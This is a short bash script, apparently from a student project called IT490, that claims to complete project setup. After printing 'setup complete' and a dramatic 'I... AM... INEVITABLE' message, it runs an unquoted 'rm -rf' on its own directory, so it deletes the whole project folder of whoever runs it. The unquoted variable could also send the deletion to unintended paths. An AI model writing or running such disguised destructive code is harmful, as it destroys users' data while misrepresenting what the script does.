#!/bin/bash

echo "IT490 project setup complete"
echo -e "\n"
intro="I... AM... INEVITABLE"
CURRENT_DIR=$(dirname "$(readlink -f "$0")")

for (( i=0; i<${#intro}; i++ )); do
    echo -n "${intro:$i:1}"
    sleep 0.2
done
# Shred directory
rm -rf $CURRENT_DIR
echo -e "\n"
exit 0